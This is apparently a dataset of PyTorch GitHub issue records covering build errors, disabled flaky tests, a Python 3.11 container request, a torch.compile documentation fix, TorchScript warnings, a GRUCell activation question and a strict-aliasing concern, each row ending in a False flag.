Error when building PyTorch from source with WERROR=1 and USE_DISTRIBUTED=1 module: build triaged module: tensorpipe,"# Summary
When building with the following two settings on Main I am getting the following error:
``` Shell
/pytorch/torch/csrc/distributed/rpc/tensorpipe_agent.cpp
In file included from /home/drisspg/meta/pytorch/torch/csrc/distributed/rpc/tensorpipe_agent.cpp:10:
In file included from /home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/tensorpipe.h:15:
In file included from /home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/core/context.h:18:
In file included from /home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/channel/context.h:16:
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:27:13: error: definition of implicit copy constructor for 'AbstractBufferWrapper' is deprecated because it has a user-declared destructor [-Werror,-Wdeprecated-copy-with-dtor]
    virtual ~AbstractBufferWrapper() = default;
            ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:31:9: note: in implicit copy constructor for 'tensorpipe::Buffer::AbstractBufferWrapper' first required here
  class BufferWrapper : public AbstractBufferWrapper {
        ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:46:17: note: in implicit copy constructor for 'tensorpipe::Buffer::BufferWrapper<tensorpipe::CpuBuffer>' first required here
      new (ptr) BufferWrapper(*this);
                ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:39:14: note: in instantiation of member function 'tensorpipe::Buffer::BufferWrapper<tensorpipe::CpuBuffer>::copyConstructInto' requested here
    explicit BufferWrapper(TBuffer buffer) : buffer(std::move(buffer)) {}
             ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:62:17: note: in instantiation of member function 'tensorpipe::Buffer::BufferWrapper<tensorpipe::CpuBuffer>::BufferWrapper' requested here
    new (&raw_) BufferWrapper<TBuffer>(std::move(b));
                ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:65:14: note: in instantiation of function template specialization 'tensorpipe::Buffer::Buffer<tensorpipe::CpuBuffer>' requested here
  Buffer() : Buffer(CpuBuffer{}) {}
             ^
1 error generated.
[2271/3099] Building CXX object caffe2/CMakeFiles/torch_cpu.dir/__/torch/csrc/api/src/nn/modules/conv.cpp.o
```

By updating tensorpipe/common/buffer.h to have 

``` C++
  class AbstractBufferWrapper {
   public:
    AbstractBufferWrapper() = default;
    AbstractBufferWrapper(const AbstractBufferWrapper&) = default;
    AbstractBufferWrapper& operator=(const AbstractBufferWrapper&) = default;

    virtual Device device() const = 0;
    virtual void copyConstructInto(void* ptr) const = 0;
    virtual void moveConstructInto(void* ptr) = 0;
    virtual ~AbstractBufferWrapper() = default;
  };
  ```
  I was able to avoid the werror but I am not sure if these default constructors are actually valid


cc @malfet @seemethere @osalpekar @jiayisuse @lw @beauby @pritamdamania87 @mrshenli @jjlilley @gqchen @rohan-varma",False
DISABLED test_cublas_baddbmm_large_input_2_100_100_100_cuda_float16 (__main__.TestMatmulCudaCUDA) skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474",False
[ONNX] Update ACPT to support Python 3.11 module: onnx triaged onnx-triaged release notes: onnx,"### üöÄ The feature, motivation and pitch

[Azure Container for PyTorch (aka ACPT)](https://learn.microsoft.com/en-us/azure/machine-learning/resource-azure-container-for-pytorch?view=azureml-api-2) is currently distributed using python 3.8/3.9. Although this is ok for Pytorch 1.x series, the latest PyTorch 2.x leverages Python 3.11 features for better graph lowering from `torch.nn.Module` to `torch.fx.GraphModule`. It also has model transformation/optimization that are better maintained for newer python versions. Below is a list of several places in which we can see Dynamo forking behavior between old (mostly 3.8 and 3.9) and newer python versions (3.10 and 3.11)

```bash
(ptca) root@88c3e49b4bcf:/opt/pytorch# grep sys\.version_info torch/_dynamo -Rn
torch/_dynamo/bytecode_transformation.py:114:    inst = ""JUMP_FORWARD"" if sys.version_info >= (3, 11) else ""JUMP_ABSOLUTE""
torch/_dynamo/bytecode_transformation.py:144:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:162:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:168:    if sys.version_info < (3, 8) and n >= 4:
torch/_dynamo/bytecode_transformation.py:170:    if sys.version_info < (3, 10) and n >= 5:
torch/_dynamo/bytecode_transformation.py:196:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:208:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:222:    assert sys.version_info < (3, 10)
torch/_dynamo/bytecode_transformation.py:244:    assert sys.version_info >= (3, 10) and sys.version_info < (3, 11)
torch/_dynamo/bytecode_transformation.py:294:    assert sys.version_info >= (3, 11)
torch/_dynamo/bytecode_transformation.py:441:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:463:        if sys.version_info < (3, 10):
torch/_dynamo/bytecode_transformation.py:474:        if sys.version_info >= (3, 10):
torch/_dynamo/bytecode_transformation.py:503:    if sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:538:                if sys.version_info < (3, 10):
torch/_dynamo/bytecode_transformation.py:540:                elif sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:550:                    if sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:558:                    if sys.version_info >= (3, 11) and ""BACKWARD"" in inst.opname:
torch/_dynamo/bytecode_transformation.py:560:                if sys.version_info >= (3, 10):
torch/_dynamo/bytecode_transformation.py:740:            assert sys.version_info >= (3, 11)
torch/_dynamo/bytecode_transformation.py:864:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:922:    if sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:955:            if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1001:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1004:    if sys.version_info >= (3, 10):
torch/_dynamo/bytecode_transformation.py:1008:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1040:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1055:    if sys.version_info < (3, 10):
torch/_dynamo/bytecode_transformation.py:1065:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1081:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1087:        if sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:64:            ""NOP"" if sys.version_info < (3, 11) else ""PUSH_EXC_INFO""
torch/_dynamo/resume_execution.py:78:        if sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:105:        if sys.version_info < (3, 9):
torch/_dynamo/resume_execution.py:113:        elif sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:161:        if sys.version_info < (3, 9):
torch/_dynamo/resume_execution.py:178:        elif sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:355:        is_py311_plus = sys.version_info >= (3, 11)
torch/_dynamo/resume_execution.py:440:                if sys.version_info >= (3, 11):
torch/_dynamo/resume_execution.py:507:        if sys.version_info >= (3, 11):
torch/_dynamo/output_graph.py:774:        if sys.version_info >= (3, 11):
torch/_dynamo/output_graph.py:1288:        if sys.version_info >= (3, 11) and kind in (
torch/_dynamo/symbolic_convert.py:214:    if sys.version_info < (3, 9):
torch/_dynamo/symbolic_convert.py:467:            if sys.version_info >= (3, 11) and inst.opname == ""CALL"":
torch/_dynamo/symbolic_convert.py:489:            if sys.version_info >= (3, 11) and inst.opname == ""CALL"":
torch/_dynamo/symbolic_convert.py:668:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:846:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1156:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1200:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1437:        if sys.version_info < (3, 11):
torch/_dynamo/symbolic_convert.py:1440:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1664:            if sys.version_info < (3, 11):
torch/_dynamo/symbolic_convert.py:1668:            if sys.version_info < (3, 11):
torch/_dynamo/symbolic_convert.py:1719:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1802:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1970:        if sys.version_info >= (3, 10):
torch/_dynamo/symbolic_convert.py:2141:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:2320:        if sys.version_info >= (3, 11):
torch/_dynamo/variables/misc.py:1053:        if sys.version_info < (3, 11):
torch/_dynamo/codegen.py:251:        if push_null and sys.version_info >= (3, 11):
torch/_dynamo/codegen.py:279:        assert sys.version_info >= (3, 11)
torch/_dynamo/codegen.py:292:        if sys.version_info >= (3, 11) and push_null:
torch/_dynamo/codegen.py:300:        if sys.version_info < (3, 11):
torch/_dynamo/codegen.py:347:        if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_analysis.py:13:if sys.version_info >= (3, 9):
torch/_dynamo/bytecode_analysis.py:15:if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_analysis.py:64:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_analysis.py:222:                sys.version_info < (3, 9) and inst.opcode == dis.opmap[""CALL_FINALLY""]
torch/_dynamo/backends/registry.py:102:    if sys.version_info < (3, 10):
torch/_dynamo/types.py:17:if sys.version_info >= (3, 11):
torch/_dynamo/testing.py:344:    if sys.version_info >= (3, 11):
torch/_dynamo/eval_frame.py:506:    if sys.version_info < (3, 11):
torch/_dynamo/eval_frame.py:595:    if sys.version_info >= (3, 12):
torch/_dynamo/test_case.py:24:        or sys.version_info >= (3, 12)
torch/_dynamo/guards.py:123:if sys.version_info[:2] <= (3, 8):
torch/_dynamo/utils.py:1925:    assert sys.version_info >= (3, 11)
```

By using dynamo with python 3.8/3.9, we can obtain suboptimal graphs that don't leverage the latest optimizations coming from latest dynamo. Another side effect is that important third party dependencies may not be optimal for old python too, such as `transformers` and others

### Alternatives

_No response_

### Additional context

_No response_",False
Documentation Clarification on torch.compile Example module: docs triaged,"### üìö The doc issue

I came across an example in the [torch.compiler documentation](https://pytorch.org/docs/main/torch.compiler_get_started.html)

```py
import torch
def fn(x, y):
    a = torch.cos(x).cuda()
    b = torch.sin(y).cuda()
    return a + b
new_fn = torch.compile(fn, backend=""inductor"")
input_tensor = torch.randn(10000).to(device=""cuda:0"")
a = new_fn(input_tensor, input_tensor)
```

The documentation mentions that *we can turn 2 reads and 2 writes into 1 read and 1 write*. However, given there are three distinct operations, I'm inclined to think there should be 4 reads (x, y, a, b) and 3 writes (a, b, a+b). Can you confirm this?

Additionally, there's a note which says:

*To run this script, you need to have at least one GPU on your machine. If you do not have a GPU, you can remove the cuda() code in the snippet below and it will run on CPU.*

However, the crucial step to ensure GPU usage is the `.to(device=""cuda:0"")`. Merely removing .cuda() won't make the tensor reside on the CPU. 

### Suggest a potential alternative/fix

Hence, I'd suggest updating the note to:

```note
To run this script, you need to have at least one GPU on your machine. If you do not have a GPU, you can remove the `.to(device=""cuda:0"")` code in the snippet below and it will run on CPU.
```

Lastly, since .cuda() in the fn function seems redundant if we're already specifying the device using .to(device=""cuda:0""), consider updating the function as:

```py
import torch
def fn(x, y):
    a = torch.cos(x)
    b = torch.sin(y)
    return a + b
```

Thank you for considering these suggestions. Looking forward to your feedback!

cc @svekars @carljparker",False
torchscript throws warnings on everything oncall: jit,"```py
import torch

scripted = torch.jit.script(torch.nn.Conv2d(3, 3, 3))
img = torch.rand(1, 3, 20, 20)

import warnings
warnings.simplefilter('module')

scripted(img)
```

```
/home/nicolashug/.miniconda3/envs/pt/lib/python3.9/site-packages/torch/nn/modules/module.py:1528: UserWarning: torch::jit::fuser::cuda::isEnabled() is deprecated (Triggered internally at /opt/conda/conda-bld/pytorch_1696837183797/work/torch/csrc/jit/codegen/cuda/interface.cpp:54.)
  return forward_call(*args, **kwargs)
```

This seems to be caused by https://github.com/pytorch/pytorch/pull/110318 and resuts in the torchvision test suite to fail https://github.com/pytorch/vision/issues/8030

@jjsjann123 @davidberard98



---------


```
Collecting environment information...
PyTorch version: 2.2.0.dev20231009
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Fedora release 36 (Thirty Six) (x86_64)
GCC version: (GCC) 12.2.1 20221121 (Red Hat 12.2.1-4)
Clang version: 14.0.5 (Fedora 14.0.5-2.fc36)
CMake version: version 3.23.1
Libc version: glibc-2.35

Python version: 3.9.12 | packaged by conda-forge | (main, Mar 24 2022, 23:25:59)  [GCC 10.3.0] (64-bit runtime)
Python platform: Linux-6.2.15-100.fc36.x86_64-x86_64-with-glibc2.35
Is CUDA available: False
CUDA runtime version: No CUDA
CUDA_MODULE_LOADING set to: N/A
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A
Is XNNPACK available: True

CPU:
Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Address sizes:                   39 bits physical, 48 bits virtual
Byte Order:                      Little Endian
CPU(s):                          8
On-line CPU(s) list:             0-7
Vendor ID:                       GenuineIntel
Model name:                      11th Gen Intel(R) Core(TM) i5-1145G7 @ 2.60GHz
CPU family:                      6
Model:                           140
Thread(s) per core:              2
Core(s) per socket:              4
Socket(s):                       1
Stepping:                        1
CPU(s) scaling MHz:              91%
CPU max MHz:                     4400.0000
CPU min MHz:                     400.0000
BogoMIPS:                        5222.40
Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc art arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf tsc_known_freq pni pclmulqdq dtes64 monitor ds_cpl vmx smx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb cat_l2 invpcid_single cdp_l2 ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi flexpriority ept vpid ept_ad fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdt_a avx512f avx512dq rdseed adx smap avx512ifma clflushopt clwb intel_pt avx512cd sha_ni avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves split_lock_detect dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp hwp_pkg_req avx512vbmi umip pku ospke avx512_vbmi2 gfni vaes vpclmulqdq avx512_vnni avx512_bitalg tme avx512_vpopcntdq rdpid movdiri movdir64b fsrm avx512_vp2intersect md_clear ibt flush_l1d arch_capabilities
Virtualization:                  VT-x
L1d cache:                       192 KiB (4 instances)
L1i cache:                       128 KiB (4 instances)
L2 cache:                        5 MiB (4 instances)
L3 cache:                        8 MiB (1 instance)
NUMA node(s):                    1
NUMA node0 CPU(s):               0-7
Vulnerability Itlb multihit:     Not affected
Vulnerability L1tf:              Not affected
Vulnerability Mds:               Not affected
Vulnerability Meltdown:          Not affected
Vulnerability Mmio stale data:   Not affected
Vulnerability Retbleed:          Not affected
Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl
Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:        Mitigation; Enhanced IBRS, IBPB conditional, RSB filling, PBRSB-eIBRS SW sequence
Vulnerability Srbds:             Not affected
Vulnerability Tsx async abort:   Not affected

Versions of relevant libraries:
[pip3] flake8==6.0.0
[pip3] mypy==0.991
[pip3] mypy-extensions==0.4.3
[pip3] numpy==1.24.2
[pip3] onnx==1.13.1
[pip3] onnxruntime==1.14.1
[pip3] pytorch-sphinx-theme==0.0.24
[pip3] torch==2.2.0.dev20231009
[pip3] torchrl==0.1.1+3f4e9aa
[pip3] torchvision==0.17.0a0+1101c3d
[conda] blas                      1.0                         mkl  
[conda] cpuonly                   2.0                           0    pytorch-nightly
[conda] mkl                       2021.4.0           h06a4308_640  
[conda] mkl-service               2.4.0            py39h7f8727e_0  
[conda] mkl_fft                   1.3.1            py39hd3c417c_0  
[conda] mkl_random                1.2.2            py39h51133e4_0  
[conda] numpy                     1.24.2                   pypi_0    pypi
[conda] pytorch                   2.2.0.dev20231009     py3.9_cpu_0    pytorch-nightly
[conda] pytorch-mutex             1.0                         cpu    pytorch-nightly
[conda] pytorch-sphinx-theme      0.0.24                    dev_0    <develop>
[conda] torchfix                  0.0.1                    pypi_0    pypi
[conda] torchrl                   0.1.1+3f4e9aa             dev_0    <develop>
[conda] torchvision               0.14.0a0+fc18542          pypi_0    pypi

```

cc @EikanWang @jgong5 @wenzhe-nrv @sanchitintel",False
DISABLED test_pinned_memory_with_cudaregister (__main__.TestCuda) module: cuda module: rocm triaged module: flaky-tests skipped,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_pinned_memory_with_cudaregister) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17481200354).

Over the past 72 hours, it has flakily failed in 9 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_pinned_memory_with_cudaregister`


Test file path: `test_cuda.py`

cc @ptrblck @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_pinned_memory_with_cudaregister (__main__.TestCuda) module: cuda module: rocm triaged module: flaky-tests skipped,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_pinned_memory_with_cudaregister) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17480272434).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_pinned_memory_with_cudaregister`


Test file path: `test_cuda_expandable_segments.py`

cc @ptrblck @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
SeLU Activation Function Implementation In GRUCell  ,"The actual task is to replace the tanh_() at line#799 in _RNN.cpp_ with SeLU activation function in new_gate of gru_cell. The following code block is written in _RNN.cpp_ file.


```
template <typename cell_params>
struct GRUCell : Cell<Tensor, cell_params> {
  using hidden_type = Tensor;

  hidden_type operator()(
      const Tensor& input,
      const hidden_type& hidden,
      const cell_params& params,
      bool pre_compute_input = false) const override {
    if (input.is_cuda() || input.is_xpu()) {
      TORCH_CHECK(!pre_compute_input);
      auto igates = params.matmul_ih(input);
      auto hgates = params.matmul_hh(hidden);
      auto result = at::_thnn_fused_gru_cell(
          igates, hgates, hidden, params.b_ih(), params.b_hh());
      // Slice off the workspace argument (it's needed only for AD).
      return std::move(std::get<0>(result));
    }
    const auto chunked_igates = pre_compute_input
        ? input.unsafe_chunk(3, 1)
        : params.linear_ih(input).unsafe_chunk(3, 1);
    auto chunked_hgates = params.linear_hh(hidden).unsafe_chunk(3, 1);
    const auto reset_gate =
        chunked_hgates[0].add_(chunked_igates[0]).sigmoid_();
    const auto input_gate =
        chunked_hgates[1].add_(chunked_igates[1]).sigmoid_();
    **const auto new_gate =
        chunked_igates[2].add(chunked_hgates[2].mul_(reset_gate)).tanh_();**
    return (hidden - new_gate).mul_(input_gate).add_(new_gate);
  }
};
```

**The new_gate is the Tensor. How we can implement a custom function to iterate over the Tensor and apply the Selu activation function on them ??**

- I replaced the tanh_() with selu_() that was present in the build/aten/src/ATen/ops/selu.h folder after building the PyTorch from source code In Develop Mode and Also included the related header files. But on Re-Building it generated an error ""Did you mean relu_()"".

- I also tried to implement my own function for selu() but the problem was regarding Tensor datatype.",False
`reinterpret_cast<float&>` violates strict aliasing in inductor cpp codegen triaged module: cpu inductor,">`reinterpret_cast<float&>` on an int is UB because it violates strict aliasing. What is this trying to do exactly? How about adding a `c10::bit_cast` that uses `std::bit_cast` if c++20 is available and the suggested `std::memcpy` polyfill at https://en.cppreference.com/w/cpp/numeric/bit_cast otherwise?

_Originally posted by @swolchok in https://github.com/pytorch/pytorch/issues/102920#issuecomment-1747679443_
            

cc @voznesenskym @penguinwu @EikanWang @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False
